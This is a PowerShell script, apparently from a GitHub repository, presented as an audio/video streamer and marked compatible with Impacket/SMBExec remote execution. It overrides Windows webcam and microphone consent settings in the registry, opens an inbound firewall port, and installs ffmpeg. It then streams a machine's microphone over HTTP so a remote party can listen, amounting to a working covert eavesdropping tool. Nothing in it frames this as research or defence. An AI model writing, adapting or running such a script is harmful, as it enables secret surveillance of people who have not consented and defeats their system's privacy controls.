<#
Stream Audio/Video - Compativel com Impacket/SMBExec
Repo: https://github.com/l0ckz3r0/StreamAudioWin
#>

# === CONFIG ===
$port = 8080
$ffmpeg = "C:\ffmpeg\bin\ffmpeg.exe"
$ffmpeg_url = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"

# === PERMISSIONS ===
function Set-Permissions {
    $paths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone",
        "HKCU:\Software\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\microphone"
    )
    foreach ($p in $paths) {
        if (-not (Test-Path $p)) { New-Item -Path $p -Force | Out-Null }
        Set-ItemProperty -Path $p -Name Value -Value Allow -Type String -Force
    }
    Remove-NetFirewallRule -Name "StreamAV" -ErrorAction SilentlyContinue | Out-Null
    New-NetFirewallRule -Name "StreamAV" -DisplayName "Stream AV" -Direction Inbound -Protocol TCP -LocalPort $port -Action Allow -Enabled True | Out-Null
}

# === INSTALL FFMPEG ===
function Install-Ffmpeg {
    if (Test-Path $ffmpeg) { return }
    $tmp_zip = "$env:TEMP\ffmpeg.zip"
    $tmp_dir = "$env:TEMP\ffmpeg_inst"
    Invoke-WebRequest -Uri $ffmpeg_url -OutFile $tmp_zip -UseBasicParsing
    Expand-Archive -Path $tmp_zip -DestinationPath $tmp_dir -Force
    $folder = Get-ChildItem -Path $tmp_dir -Directory -Filter "ffmpeg-*" | Select-Object -First 1
    New-Item -ItemType Directory -Path "C:\ffmpeg\bin" -Force | Out-Null
    Copy-Item -Path "$($folder.FullName)\bin\*" -Destination "C:\ffmpeg\bin\" -Recurse -Force
    $env:PATH += ";C:\ffmpeg\bin"
    [Environment]::SetEnvironmentVariable("PATH", $env:PATH, "Machine")
    Remove-Item $tmp_zip, $tmp_dir -Recurse -Force -ErrorAction SilentlyContinue
}

# === GET IP ===
function Get-MyIP {
    $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
        $_.InterfaceAlias -notmatch "Loopback|VMware|Virtual" -and $_.IPAddress -notlike "169.254.*"
    } | Select-Object -First 1).IPAddress
    if (-not $ip) { $ip = "10.0.0.92" }
    return $ip
}

# === MAIN ===
Clear-Host
Write-Host "==========================================="
Write-Host "      STREAM AUDIO / VIDEO"
Write-Host "==========================================="

Set-Permissions
Install-Ffmpeg
$myip = Get-MyIP

Write-Host "`nStarting transmission..."

# Usa identificador tecnico direto do microfone que ja funcionou antes
$cmd = "`"$ffmpeg`" -y -f dshow -rtbufsize 2M -i audio=`"@device_cm_{33D9A762-90C8-11D0-BD43-00A0C911CE86}\wave_{49D00171-596A-469A-9582-F9E720EA5E4F}`" -acodec mp3 -b:a 64k -ar 22050 -ac 1 -f mp3 -listen 1 `"http://0.0.0.0:$port/stream`""

Write-Host "`n==========================================="
Write-Host "TRANSMISSION ACTIVE"
Write-Host "Access via VLC: http://$myip`:$port/stream"
Write-Host "==========================================="

Invoke-Expression $cmd
